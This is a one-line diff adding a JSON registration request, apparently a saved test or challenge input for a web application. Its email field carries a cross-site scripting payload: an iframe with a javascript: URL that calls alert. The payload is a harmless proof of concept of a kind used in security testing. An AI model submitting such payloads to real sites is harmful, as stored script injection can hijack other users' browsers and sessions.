@@ -1,0 +1,1 @@
+{"email":"<iframe src="javascript:alert(`xss`)">","password":"bfe100lol","passwordRepeat":"bfe100lol","securityQuestion":{"id":6,"question":"Paternal grandmother's first name?","createdAt":"2022-09-22T17:34:35.128Z","updatedAt":"2022-09-22T17:34:35.128Z"},"securityAnswer":"yes"}
